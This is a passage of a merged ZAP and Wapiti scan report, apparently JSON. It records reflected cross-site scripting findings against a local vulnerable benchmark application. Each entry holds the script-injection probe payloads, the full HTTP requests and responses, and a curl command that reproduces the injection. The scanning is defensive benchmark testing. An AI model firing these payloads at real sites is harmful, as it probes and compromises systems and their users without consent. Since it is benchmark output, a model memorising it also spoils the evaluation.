            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01509', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01509.html?BenchmarkTest01509=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxNTA5PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01509', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01509.html?BenchmarkTest01509=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01509=SafeText&BenchmarkTest01509=Movies&BenchmarkTest01509=Writing&BenchmarkTest01509=%3CScRiPt%3Ealert%28%27wd1y4byt2b%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wd1y4byt2b')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01510",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01510?BenchmarkTest01510=%3CScRiPt%3Ealert%28%27wblj06ez0r%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wblj06ez0r')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wblj06ez0r')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01510\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01510.html\" -d \"BenchmarkTest01510=%3CScRiPt%3Ealert%28%27wblj06ez0r%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01510"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01510', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01510.html?BenchmarkTest01510=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxNTEwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01510', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01510.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01510=%3CScRiPt%3Ealert%28%27wblj06ez0r%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:25:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('wblj06ez0r')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01583",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01583?secure=default&productID=default&foo=foo&BenchmarkTest01583=%3CScRiPt%3Ealert%28%27wj27gppqr2%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 4",
                    "Wapiti - 4"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                      "Wapiti - <ScRiPt>alert('wj27gppqr2')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                  "Wapiti - <ScRiPt>alert('wj27gppqr2')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01583\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01583.html?BenchmarkTest01583=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest01583=%3CScRiPt%3Ealert%28%27wj27gppqr2%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01583"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01583', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '111', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01583.html?BenchmarkTest01583=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAxNTgzPSUzQyUyRnAlM0UlM0NzY3JJcHQlM0VhbGVydCUyODElMjklM0IlM0MlMkZzY1JpcHQlM0UlM0NwJTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01583', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01583.html?BenchmarkTest01583=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest01583=%3CScRiPt%3Ealert%28%27wj27gppqr2%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '120', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:59 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and </p><scrIpt>alert(1);</scRipt><p>_SafeStuff.\\n</p>\\n</body>\\n</html>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '123', 'date': 'Sun, 31 Aug 2025 04:25:16 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and <ScRiPt>alert('wj27gppqr2')</sCrIpT>_SafeStuff.\\n</p>\\n</body>\\n</html>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01584",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01584?BenchmarkTest01584=SafeText&BenchmarkTest01584=Movies&BenchmarkTest01584=Writing&BenchmarkTest01584=%3CScRiPt%3Ealert%28%27wlvgukfeku%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wlvgukfeku')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wlvgukfeku')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01584\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01584.html?BenchmarkTest01584=SafeText\" -d \"BenchmarkTest01584=SafeText&BenchmarkTest01584=Movies&BenchmarkTest01584=Writing&BenchmarkTest01584=%3CScRiPt%3Ealert%28%27wlvgukfeku%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01584"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01584', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01584.html?BenchmarkTest01584=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxNTg0PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01584', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01584.html?BenchmarkTest01584=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01584=SafeText&BenchmarkTest01584=Movies&BenchmarkTest01584=Writing&BenchmarkTest01584=%3CScRiPt%3Ealert%28%27wlvgukfeku%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:22 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wlvgukfeku')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01587",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01587?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01587=%3CScRiPt%3Ealert%28%27wxbufpo96l%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wxbufpo96l')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wxbufpo96l')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01587\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01587.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01587=%3CScRiPt%3Ealert%28%27wxbufpo96l%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01587"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01587', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01587.html?BenchmarkTest01587=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDE1ODc9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01587', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01587.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01587=%3CScRiPt%3Ealert%28%27wxbufpo96l%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:59 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:24 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wxbufpo96l')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
